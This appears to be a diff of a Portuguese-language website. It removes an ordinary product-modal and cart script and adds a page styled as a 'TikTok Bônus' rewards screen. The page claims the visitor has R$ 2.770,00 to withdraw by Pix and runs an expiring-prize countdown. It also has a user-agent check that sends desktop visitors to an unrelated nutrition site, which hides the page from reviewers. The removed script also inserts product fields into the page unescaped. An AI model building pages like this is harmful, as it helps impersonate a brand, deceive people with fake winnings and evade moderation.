-            floatBox.style.position = 'absolute';
-            floatBox.style.right = '18px';
-            floatBox.style.left = 'auto';
-            floatBox.style.bottom = '';
-            const update = () => {
-                const h = floatBox.offsetHeight || 0;
-                const top = modalBox.scrollTop + modalBox.clientHeight - h - 18;
-                floatBox.style.top = top + 'px';
-            };
-            // Limpa listeners antigos se houver
-            if (typeof _buyFloatCleanup === 'function') { _buyFloatCleanup(); }
-            update();
-            modalBox.addEventListener('scroll', update);
-            window.addEventListener('resize', update);
-            let ro;
-            if ('ResizeObserver' in window) {
-                ro = new ResizeObserver(update);
-                ro.observe(modalBox);
-                ro.observe(floatBox);
-            }
-            _buyFloatCleanup = () => {
-                modalBox.removeEventListener('scroll', update);
-                window.removeEventListener('resize', update);
-                if (ro) try { ro.disconnect(); } catch (e) { }
-            };
-        }
-
-        function renderVariacoes(variacoes = []) {
-            const grid = document.getElementById('grid-variacoes');
-            if (!grid) return;
-            grid.innerHTML = '';
-            if (!variacoes.length) {
-                const aviso = document.createElement('p');
-                aviso.className = 'text-sm text-gray-500';
-                aviso.textContent = 'Este produto não possui variações cadastradas.';
-                grid.appendChild(aviso);
-                return;
-            }
-            // Agrupa variações por tipo (ex: cor, tamanho)
-            const grupos = {};
-            variacoes.forEach((v, idx) => {
-                const tipo = v.tipo || 'variação';
-                if (!grupos[tipo]) grupos[tipo] = [];
-                grupos[tipo].push({ ...v, idx });
-            });
-            Object.keys(grupos).forEach(tipo => {
-                // Título do grupo
-                const label = tipo.charAt(0).toUpperCase() + tipo.slice(1);
-                const groupTitle = document.createElement('div');
-                groupTitle.className = 'font-semibold text-sm mb-1 mt-2';
-                groupTitle.textContent = label;
-                grid.appendChild(groupTitle);
-                // Container das opções: chips menores para 'tamanho', grid para demais
-                const row = document.createElement('div');
-                const isTamanho = (tipo.toLowerCase() === 'tamanho');
-                row.className = isTamanho ? 'flex flex-wrap gap-2 mb-2' : 'grid grid-cols-2 gap-2 mb-2 sm:grid-cols-3';
-                grupos[tipo].forEach(variacao => {
-                    const resolvedImage = variacao.imagem || (modalProdutoAtual?.imagemPrincipal || '');
-                    const btn = document.createElement('button');
-                    btn.type = 'button';
-                    if (isTamanho) {
-                        // Chips compactos para tamanho (sem w-full)
-                        btn.className = 'inline-flex items-center justify-center px-2 py-1 border rounded-md bg-white text-xs font-medium cursor-pointer transition-all hover:shadow-sm';
-                        btn.style.minWidth = '36px';
-                        btn.style.height = '32px';
-                        btn.style.borderRadius = '10px';
-                    } else {
-                        btn.className = 'flex items-center justify-start w-full px-3 py-2 border rounded-lg bg-white shadow-sm text-sm cursor-pointer transition-all hover:shadow-md gap-2';
-                    }
-                    btn.setAttribute('data-index', variacao.idx);
-                    btn.setAttribute('data-tipo', variacao.tipo);
-                    btn.setAttribute('data-titulo', variacao.titulo);
-                    btn.setAttribute('data-preco', variacao.preco);
-                    btn.setAttribute('data-preco-comparacao', variacao.precoComparacao);
-                    btn.setAttribute('data-desconto', variacao.desconto);
-                    btn.setAttribute('data-link', variacao.checkoutLink);
-                    btn.setAttribute('data-imagem', resolvedImage);
-                    btn.setAttribute('data-variacao-id', variacao.id ?? '');
-                    btn.innerHTML = `
-                                                ${tipo.toLowerCase() !== 'tamanho' && variacao.imagem ? `<img src="${resolvedImage}" class="w-8 h-8 rounded mr-1" alt="${variacao.titulo}">` : ''}
-                                                <span class="font-medium">${variacao.titulo}</span>
-                                            `;
-                    if (!isTamanho) {
-                        btn.addEventListener('click', () => selecionarVariacao(btn));
-                    } else {
-                        btn.addEventListener('click', function () {
-                            // Remove destaque de todos do grupo
-                            row.querySelectorAll('button').forEach(b => b.classList.remove('border-rose-600', 'ring-2', 'ring-rose-300'));
-                            // Adiciona destaque só neste
-                            btn.classList.add('border-rose-600', 'ring-2', 'ring-rose-300');
-                        });
-                    }
-                    row.appendChild(btn);
-                });
-                grid.appendChild(row);
-            });
-            // Quantidade no final do modal (fora do sticky); botão Comprar Agora flutuando sozinho
-            const contentEl = document.getElementById('modal-conteudo') || grid.parentNode;
-            let buyBox = document.getElementById('buy-positions');
-            if (!buyBox) {
-                buyBox = document.createElement('div');
-                buyBox.id = 'buy-positions';
-                contentEl.appendChild(buyBox);
-            }
-            // Deixa somente o botão no sticky
-            buyBox.innerHTML = `
-                                        <a href="javascript:void(0);" onclick="comprarAgora()" id="div_ors_4" class="w-full bg-rose-600 hover:bg-rose-700 text-white font-semibold py-3 text-center block" style="font-size:1.1rem; border-radius: 12px;">Comprar Agora</a>
-                                    `;
-            // Adiciona bloco de quantidade antes do sticky, no final do conteúdo rolável
-            let qtyBox = document.getElementById('qty-row');
-            if (!qtyBox) {
-                qtyBox = document.createElement('div');
-                qtyBox.id = 'qty-row';
-                qtyBox.className = 'mt-4 mb-2';
-                contentEl.insertBefore(qtyBox, buyBox);
-            }
-            qtyBox.innerHTML = `
-                                        <div class="flex items-center justify-between">
-                                          <label class="font-medium mr-2">QUANTIDADE</label>
-                                          <div class="flex items-center border rounded px-2 py-1 bg-white">
-                                            <button type="button" id="qtd-menos" class="text-lg px-2">-</button>
-                                            <input type="number" id="qtd-input" value="1" min="1" class="w-12 text-center mx-1 border-none outline-none" />
-                                            <button type="button" id="qtd-mais" class="text-lg px-2">+</button>
-                                          </div>
-                                        </div>
-                                    `;
-            // Lógica funcional dos botões de quantidade
-            const input = qtyBox.querySelector('#qtd-input');
-            const btnMenos = qtyBox.querySelector('#qtd-menos');
-            const btnMais = qtyBox.querySelector('#qtd-mais');
-            btnMenos.addEventListener('click', () => {
-                let v = parseInt(input.value, 10) || 1;
-                if (v > 1) v--;
-                input.value = v;
-                if (window.produtoSelecionado) window.produtoSelecionado.quantidade = v;
-            });
-            btnMais.addEventListener('click', () => {
-                let v = parseInt(input.value, 10) || 1;
-                v++;
-                input.value = v;
-                if (window.produtoSelecionado) window.produtoSelecionado.quantidade = v;
-            });
-            input.addEventListener('change', () => {
-                let v = parseInt(input.value, 10);
-                if (!v || v < 1) v = 1;
-                input.value = v;
-                if (window.produtoSelecionado) window.produtoSelecionado.quantidade = v;
-            });
-            if (window.produtoSelecionado) window.produtoSelecionado.quantidade = parseInt(input.value, 10);
-        }
-
-        function selecionarVariacao(elemento) {
-            const tipo = elemento.getAttribute('data-tipo');
-            document.querySelectorAll(`[data-tipo='${tipo}']`).forEach(item => {
-                item.classList.remove('border-rose-600', 'ring-2', 'ring-rose-300');
-            });
-            elemento.classList.add('border-rose-600', 'ring-2', 'ring-rose-300');
-            const titulo = elemento.getAttribute('data-titulo') || '';
-            // Corrigir para pegar preço do sistema, não deixar NaN
-            let preco = elemento.getAttribute('data-preco');
-            preco = preco !== null && preco !== '' && !isNaN(Number(preco)) ? Number(preco) : (modalProdutoAtual?.preco || 0);
-            let precoComparacao = elemento.getAttribute('data-preco-comparacao');
-            precoComparacao = precoComparacao !== null && precoComparacao !== '' && !isNaN(Number(precoComparacao)) ? Number(precoComparacao) : (modalProdutoAtual?.preco_comparacao || preco);
-            let desconto = elemento.getAttribute('data-desconto');
-            desconto = desconto !== null && desconto !== '' && !isNaN(Number(desconto)) ? Number(desconto) : (modalProdutoAtual?.desconto || 0);
-            const link = elemento.getAttribute('data-link') || '';
-            const imagem = elemento.getAttribute('data-imagem') || '';
-            const variacaoId = elemento.getAttribute('data-variacao-id') || '';
-            document.getElementById('div_ors_1').innerText = titulo;
-            document.getElementById('div_ors_3').innerText = 'R$ ' + preco.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
-            document.getElementById('div_ors_2').innerText = 'R$ ' + precoComparacao.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
-            document.getElementById('div_ors_5').innerText = desconto ? `${desconto}%` : '';
-            document.getElementById('img-solts').src = imagem || (modalProdutoAtual?.imagemPrincipal || '');
-            produtoSelecionado = {
-                produtoId: modalProdutoAtual?.id ?? null,
-                variacaoId,
-                titulo,
-                preco,
-                precoComparacao,
-                desconto,
-                link_checkout: link || modalProdutoAtual?.checkoutUrl || 'checkout.html',
-                imagem,
-                quantidade: 1
-            };
-        }
-
-        function abrirModalProduto(produto) {
-            // Organiza e formata a descrição do produto ao abrir o modal, somente após carregar o produto do sistema
-            function renderDescricaoProduto(produtoObj) {
-                const descEl = document.getElementById('descricao-produto-dinamica');
-                if (descEl && produtoObj && produtoObj.descricao) {
-                    let desc = produtoObj.descricao;
-                    // Quebra linhas duplas em parágrafos
-                    desc = desc.replace(/\n{2,}/g, '</p><p>');
-                    // Quebra linha simples em <br>
-                    desc = desc.replace(/\n/g, '<br>');
-                    // Listas automáticas (ex: - item)
-                    desc = desc.replace(/\- (.+?)(?=<br>|$)/g, '<li>$1</li>');
-                    if (desc.includes('<li>')) desc = '<ul style="margin-left:18px;list-style:disc;">' + desc + '</ul>';
-                    descEl.innerHTML = '<p>' + desc + '</p>';
-                } else if (descEl) {
-                    descEl.innerHTML = '<span style="color:#888;">Sem descrição cadastrada.</span>';
-                }
-            }
-            // Sempre busca o produto mais atualizado do sistema
-            fetch('produtos.json')
-                .then(resp => resp.ok ? resp.json() : null)
-                .then(produtos => {
-                    if (!Array.isArray(produtos)) return;
-                    let produtoAtual = produtos.find(p => String(p.id) === String(produto.id));
-                    if (!produtoAtual) produtoAtual = produto; // fallback
-                    modalProdutoAtual = produtoAtual;
-                    produtoSelecionado = null;
-                    abrirModal();
-                    const loader = document.getElementById('modal-loader');
-                    const conteudo = document.getElementById('modal-conteudo');
-                    if (loader && conteudo) {
-                        loader.classList.remove('hidden');
-                        conteudo.classList.add('hidden');
-                    }
-                    setTimeout(() => {
-                        const img = document.getElementById('img-solts');
-                        const title = document.getElementById('div_ors_1');
-                        const preco = document.getElementById('div_ors_3');
-                        const precoComp = document.getElementById('div_ors_2');
-                        const desconto = document.getElementById('div_ors_5');
-                        // Puxa imagem principal do produto ou da variação selecionada
-                        let imagemSrc = produtoAtual.imagemPrincipal;
-                        if (produtoAtual.fotos && Array.isArray(produtoAtual.fotos) && produtoAtual.fotos.length > 0) {
-                            imagemSrc = produtoAtual.fotos[0];
-                        }
-                        if (img) img.src = imagemSrc || '';
-                        if (title) title.innerHTML = produtoAtual.titulo || '';
-                        // Corrigir preços do sistema
-                        let precoVal = produtoAtual.preco || produtoAtual.preco_comparacao || 0;
-                        let precoCompVal = produtoAtual.preco_comparacao || produtoAtual.preco || 0;
-                        let descontoVal = produtoAtual.desconto || 0;
-                        if (preco) preco.innerText = 'R$ ' + precoVal.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
-                        if (precoComp) precoComp.innerText = 'R$ ' + precoCompVal.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
-                        if (desconto) desconto.innerText = descontoVal ? `${descontoVal}%` : '';
-                        const modal = document.querySelector('#meuModal > .bg-white');
-                        if (modal) {
-                            // Mantém o modal ancorado na base: sem margem superior
-                            modal.style.marginTop = '0px';
-                            modal.style.maxWidth = '480px';
-                            modal.style.borderRadius = '18px';
-                        }
-                        const btnClose = modal?.querySelector('button[aria-label="Fechar"]');
-                        if (btnClose) {
-                            btnClose.style.top = '18px';
-                            btnClose.style.right = '18px';
-                        }
-                        const flexRow = conteudo?.querySelector('.flex.flex-row.items-start.gap-3.w-full');
-                        if (flexRow) {
-                            flexRow.style.alignItems = 'flex-start';
-                            flexRow.style.gap = '18px';
-                        }
-                        if (img) {
-                            img.style.width = '90px';
-                            img.style.height = '90px';
-                            img.style.borderRadius = '12px';
-                            img.style.boxShadow = '0 2px 12px #0001';
-                        }
-                        const gridVar = document.getElementById('grid-variacoes');
-                        if (gridVar) {
-                            gridVar.style.marginTop = '10px';
-                        }
-                        if (!produtoAtual.variacoes || produtoAtual.variacoes.length === 0) {
-                            produtoSelecionado = {
-                                produtoId: produtoAtual.id ?? null,
-                                variacaoId: null,
-                                titulo: produtoAtual.titulo,
-                                preco: precoVal,
-                                precoComparacao: precoCompVal,
-                                desconto: descontoVal,
-                                link_checkout: produtoAtual.checkoutUrl,
-                                imagem: produtoAtual.imagemPrincipal,
-                                quantidade: 1
-                            };
-                        }
-                        document.getElementById('titulo-variacoes').textContent = (produtoAtual.variacoes && produtoAtual.variacoes.length) ? 'Variações' : 'Produto';
-                        renderVariacoes(produtoAtual.variacoes || []);
-                        // Chama a função de descrição formatada após garantir que o produto está carregado
-                        renderDescricaoProduto(produtoAtual);
-                        if (loader && conteudo) {
-                            loader.classList.add('hidden');
-                            conteudo.classList.remove('hidden');
-                        }
-                    }, 400);
-                });
-        }
-
-        function comprarAgora() {
-            if (!produtoSelecionado) {
-                showCenterToast('Selecione uma variação para continuar.', 'error', 2200);
-                return;
-            }
-            // Atualiza a quantidade do produtoSelecionado com o valor do input
-            const qtdInput = document.getElementById('qtd-input');
-            let quantidade = 1;
-            if (qtdInput) {
-                quantidade = parseInt(qtdInput.value, 10);
-                if (!quantidade || quantidade < 1) quantidade = 1;
-            }
-            produtoSelecionado.quantidade = quantidade;
-            // Adiciona ao carrinho (permite múltiplos iguais, soma quantidade se já existe)
-            let carrinho = [];
-            try {
-                carrinho = JSON.parse(localStorage.getItem('carrinho') || '[]');
-            } catch (e) {
-                carrinho = [];
-            }
-            const idx = carrinho.findIndex(p => p.produtoId === produtoSelecionado.produtoId && p.variacaoId === produtoSelecionado.variacaoId);
-            if (idx > -1) {
-                // Se já existe, soma a quantidade
-                carrinho[idx].quantidade += quantidade;
-            } else {
-                carrinho.push({ ...produtoSelecionado });
-            }
-            localStorage.setItem('carrinho', JSON.stringify(carrinho));
-            // Animação visual: produto voando para o carrinho
-            // Atualiza contador do carrinho imediatamente antes da animação
-            if (window.cart && typeof window.cart.updateCartCount === 'function') {
-                window.cart.updateCartCount();
-            } else {
-                // fallback: atualizar contador manualmente
-                const count = carrinho.reduce((acc, item) => acc + (item.quantidade || 1), 0);
-                const el = document.getElementById('cart-count-header');
-                if (el) el.textContent = count;
-            }
-            animateProductToCart(function () {
-                // Animação/toast central
-                showCenterToast('Adicionado ao carrinho', 'success', 1800);
-                // Fecha o modal após um pequeno delay
-                setTimeout(function () {
-                    fecharModal();
-                }, 350);
-            });
-            // Animação visual: produto voando para o carrinho
-            function animateProductToCart(callback) {
-                const img = document.getElementById('img-solts');
-                const cart = document.getElementById('cart-count-header');
-                if (!img || !cart) { if (callback) callback(); return; }
-                const imgRect = img.getBoundingClientRect();
-                const cartRect = cart.getBoundingClientRect();
-                const scrollX = window.scrollX || window.pageXOffset;
-                const scrollY = window.scrollY || window.pageYOffset;
-                const clone = img.cloneNode(true);
-                clone.style.position = 'fixed';
-                // Posição inicial: centro da tela, embaixo
-                const startX = window.innerWidth / 2 - 32 + scrollX;
-                const startY = window.innerHeight - 80 + scrollY;
-                clone.style.left = startX + 'px';
-                clone.style.top = startY + 'px';
-                clone.style.width = '64px';
-                clone.style.height = '64px';
-                clone.style.borderRadius = '50%';
-                clone.style.objectFit = 'cover';
-                clone.style.boxShadow = '0 2px 12px #0002';
-                clone.style.zIndex = 9999;
-                clone.style.transition = 'all 0.8s cubic-bezier(.4,2,.6,1)';
-                clone.style.pointerEvents = 'none';
-                clone.style.opacity = '1';
-                document.body.appendChild(clone);
-                requestAnimationFrame(() => {
-                    // Destino: centro do carrinho
-                    const cartCenterX = cartRect.left + cartRect.width / 2 + scrollX;
-                    const cartCenterY = cartRect.top + cartRect.height / 2 + scrollY;
-                    clone.style.left = (cartCenterX - 12) + 'px';
-                    clone.style.top = (cartCenterY - 12) + 'px';
-                    clone.style.width = '24px';
-                    clone.style.height = '24px';
-                    clone.style.opacity = '0.7';
-                });
-                setTimeout(() => {
-                    clone.remove();
-                    if (callback) callback();
-                }, 800);
-            }
-        }
-    </script>
-
-    <script>
-        function handleOpenShareSection() {
-            const shareSection = document.getElementById('share-section');
-            const shareOverlay = document.getElementById('share-overlay');
-            if (shareSection && shareOverlay) {
-                shareOverlay.style.display = 'block';
-                shareSection.style.display = 'block';
-
-                // Prevent touch events from propagating
-                document.body.style.overflow = 'hidden';
-                document.body.style.touchAction = 'none';
-
-                setTimeout(() => {
-                    shareOverlay.classList.add('active');
-                    shareSection.classList.add('active');
-                }, 10);
-            }
-        }
-
-        function handleOpenComplaintSection() {
-            const complaintSection = document.getElementById('complaint-section');
-            const complaintOverlay = document.getElementById('complaint-overlay');
-            if (complaintSection && complaintOverlay) {
-                complaintOverlay.style.display = 'block';
-                complaintSection.style.display = 'block';
-
-                // Prevent touch events from propagating
-                document.body.style.overflow = 'hidden';
-                document.body.style.touchAction = 'none';
-
-                setTimeout(() => {
-                    complaintOverlay.classList.add('active');
-                    complaintSection.classList.add('active');
-                }, 10);
-            }
-        }
-
-        function closeShareSection() {
-            const shareSection = document.getElementById('share-section');
-            const shareOverlay = document.getElementById('share-overlay');
-            if (shareSection && shareOverlay) {
-                shareOverlay.classList.remove('active');
-                shareSection.classList.remove('active');
-
-                setTimeout(() => {
-                    shareOverlay.style.display = 'none';
-                    shareSection.style.display = 'none';
-                }, 300);
-
-                // Restore body scroll
-                document.body.style.overflow = '';
-                document.body.style.touchAction = '';
-            }
-        }
-
-        function closeComplaintSection() {
-            const complaintSection = document.getElementById('complaint-section');
-            const complaintOverlay = document.getElementById('complaint-overlay');
-            if (complaintSection && complaintOverlay) {
-                complaintOverlay.classList.remove('active');
-                complaintSection.classList.remove('active');
-
-                setTimeout(() => {
-                    complaintOverlay.style.display = 'none';
-                    complaintSection.style.display = 'none';
-                }, 300);
-
-                // Restore body scroll
-                document.body.style.overflow = '';
-                document.body.style.touchAction = '';
-            }
-        }
-
-        async function copyLink() {
-            try {
-                await navigator.clipboard.writeText(window.location.href);
-                const copyBtn = document.getElementById('copy-link-btn');
-                if (copyBtn) {
-                    const originalText = copyBtn.textContent;
-                    copyBtn.textContent = 'Link copiado!';
-                    setTimeout(() => {
-                        copyBtn.textContent = originalText;
-                    }, 1500);
-                }
-            } catch (e) {
-                // Fallback para navegadores mais antigos
-                const tempInput = document.createElement('input');
-                const url = window.location.href;
-                document.body.appendChild(tempInput);
-                tempInput.value = url;
-                tempInput.select();
-                document.execCommand('copy');
-                document.body.removeChild(tempInput);
-                alert('Link copiado para a área de transferência!');
-            }
-            // Fecha com animação suave
-            closeShareSection();
-        }
-
-        seguirBtn.addEventListener('click', () => {
-            seguirBtn.textContent = 'Seguindo';
-        });
-
-        document.addEventListener('DOMContentLoaded', function () {
-            // Inicialização do modal de tela cheia (se existir)
-            const fullscreenContainer = document.getElementById('fullscreen-container');
-            const fullscreenClose = document.getElementById('fullscreen-close');
-
-            if (fullscreenClose && fullscreenContainer) {
-                fullscreenClose.addEventListener('click', closeFullscreen);
-                fullscreenContainer.addEventListener('click', (e) => {
-                    if (e.target === fullscreenContainer) {
-                        closeFullscreen();
-                    }
-                });
-            }
-        });
-    </script>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "upjh2883u4");
+</script>
+
+    <link rel="stylesheet" href="css/style.css">
+    <title>Document</title>
+  </head>
+  <body>
+    <body>
 
 <script>
-    document.getElementById('save-button').addEventListener('click', function (e) {
-        e.preventDefault();
-        showCenterToast('Produto adicionado aos favoritos', 'success', 1800);
-    });
-</script></body></html>
+(function () {
+    const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);
+
+    if (!isMobile) {
+        window.location.replace("https://www.nutren.com.br/mulher/artigos/ciencia-da-nutricao/bem-estar-saude");
+    }
+})();
+</script>
+    <main id="screens">
+      <section id="one" class="screen">
+        <div class="title">TikTok Bônus</div>
+        <div class="saldo">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info">
+              <div class="saldo-label">
+                <span class="saldo-text">Seu saldo</span>
+                <img src="images/p-saldo.svg" alt="" class="p-saldo">
+              </div>
+
+              <div id="saldo-valor" class="saldo-valor" aria-live="polite">
+                <span class="valor-currency valor-currency-dois valor-currency-tres" data-amount-target="2770.00">R$ 2.770,00</span>
+              </div>
+            </div>
+
+            <div class="saldo-action">
+              <button type="button" class="btn-sacar" aria-label="Sacar" disabled="">
+                <span class="btn-text">Sacar</span>
+                <span class="pix-badge" aria-hidden="true">
+                  <img src="images/pix-logo.svg" alt="">
+                </span>
+              </button>
+            </div>
+          </div>
+        </div>
+        <div class="bloco-dois">
+          <div class="parabens">
+            <div class="parabens-txt">
+              <span class="parabens-txtum">Parabéns!</span>
+              <span class="parabens-txtdois">Você concluiu
+                <span class="nobreak">todas as tarefas</span></span>
+
+              <span class="parabens-valor">R$ 2.770,00</span>
+            </div>
+            <img src="images/parabens-img.png" alt="" class="parabens-img">
+          </div>
+          <div class="line"></div>
+          <div class="entre">
+            <span class="entre-txt">Entre por 14 dias para ganhar
+              <span class="entre-pts">8.414 pontos</span>
+              <span class="entre-data">• 12 de nov - 25 de nov</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Sacar">
+              <span class="btn-concluido-text">Concluído</span>
+            </button>
+          </div>
+          <div class="concluiu">
+            <span class="concluiu-txt">Você concluiu todos os dias de check-in.</span>
+          </div>
+          <div class="dia">
+            <div class="day-tracker">
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">50</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 01</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">100</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 02</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">150</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 03</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">200</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 04</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">250</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 05</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">300</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 06</div>
+              </div>
+            </div>
+          </div>
+          <div class="line line-dois"></div>
+
+          <div class="entre">
+            <span class="entre-txt entre-txt-dois">Vê anúncios direcionados diariamente para ganhares até
+              <span class="entre-pts">2.730 pontos</span>
+              <span class="entre-data">• 30/30 anúncios assistidos</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Sacar">
+              <span class="btn-concluido-text">Concluído</span>
+            </button>
+          </div>
+          <div class="line line-dois"></div>
+
+          <div class="entre">
+            <span class="entre-txt entre-txt-dois">Assistir vídeos
+              <span class="entre-pts">500 pontos</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Sacar">
+              <span class="btn-concluido-text">Concluído</span>
+            </button>
+          </div>
+          <div class="assista">
+            <span class="assista-txt">Assista por 10 min </span>
+            <svg class="assista-tail" xmlns="http://www.w3.org/2000/svg" width="7" height="6" viewBox="0 0 7 6" fill="none">
+              <path d="M4.03259 5.25C3.64769 5.91667 2.68544 5.91667 2.30054 5.25L0.135475 1.5C-0.249425 0.833333 0.231701 6.49976e-07 1.0015 5.82678e-07L5.33163 2.04126e-07C6.10143 1.36828e-07 6.58255 0.833334 6.19765 1.5L4.03259 5.25Z" fill="#F1F1F1"></path>
+            </svg>
+          </div>
+          <div class="barra">
+            <div class="progress-bar">
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">50 pontos</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">100 pontos</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">150 pontos</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">225 pontos</span>
+              </div>
+            </div>
+            <div class="line line-dois"></div>
+            <div class="entre">
+              <span class="entre-txt entre-txt-dois">Resgate suas recompensas e ganhe
+                <span class="entre-pts">640 pontos</span>
+                <span class="entre-data">• 8/8 resgatados</span>
+              </span>
+              <button type="button" class="btn-concluido" aria-label="Sacar">
+                <span class="btn-concluido-text">Concluído</span>
+              </button>
+            </div>
+            <div class="line line-dois"></div>
+            <div class="entre">
+              <span class="entre-txt entre-txt-dois">Faça 60 pesquisas diárias para ganhar até
+                <span class="entre-pts">996 pontos</span>
+                <span class="entre-data">• 60 pesquisas feitas hoje</span>
+              </span>
+              <button type="button" class="btn-concluido" aria-label="Sacar">
+                <span class="btn-concluido-text">Concluído</span>
+              </button>
+            </div>
+
+            <!-- ADICIONEI A CLASSE "posicao-direita" AQUI -->
+            <div class="assista posicao-direita">
+              <span class="assista-txt">Até 756 pontos</span>
+              <svg class="assista-tail taildois" xmlns="http://www.w3.org/2000/svg" width="7" height="6" viewBox="0 0 7 6" fill="none">
+                <path d="M4.03259 5.25C3.64769 5.91667 2.68544 5.91667 2.30054 5.25L0.135475 1.5C-0.249425 0.833333 0.231701 6.49976e-07 1.0015 5.82678e-07L5.33163 2.04126e-07C6.10143 1.36828e-07 6.58255 0.833334 6.19765 1.5L4.03259 5.25Z" fill="#F1F1F1"></path>
+              </svg>
+            </div>
+            <div class="progress-bar">
+              <div class="progress-step hide">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">16 pesquisas</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">36 pesquisas</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">60 pesquisas</span>
+              </div>
+            </div>
+            <div class="obtem">
+              <span class="obtem-txt">Obtém 21 pontos por escreveres uma consulta na barra de
+                pesquisa, ou 0 ponto por tocares numa pesquisa sugerida, como em
+                "Podes gostar".</span>
+            </div>
+            <div class="line line-dois"></div>
+
+            <div class="entre">
+              <span class="entre-txt">Convide 1 amigo para se inscrever e ganhar
+                <span class="entre-pts">100.000 pontos - 200.000 pontos</span>
+              </span>
+              <button type="button" class="btn-concluido" aria-label="Sacar">
+                <span class="btn-concluido-text">Concluído</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="two" class="screen" aria-hidden="true">
+        <div class="modal-inner" role="dialog" aria-modal="true" aria-labelledby="modal-title">
+          <div class="popup">
+            <img src="images/gol.png" alt="" class="gol-img">
+            <span class="gol">Gol de Prêmios</span>
+            <span class="gol-txt">Parabéns! Como parte de uma campanha de recompensas exclusiva. </span><span class="valor-currency gol-valor valor-currency-dois valor-currency-quatro" data-amount-target="2770.00">R$ 2.770,00</span>
+            <div class="timer-wrapper expira-em-popup">
+              <div class="timer-label">Expira em</div>
+
+              <div class="timer-clock">
+                <!-- Horas -->
+                <div class="timer-box" data-timer="hours">00</div>
+                <!-- Não é usado, mas bom ter -->
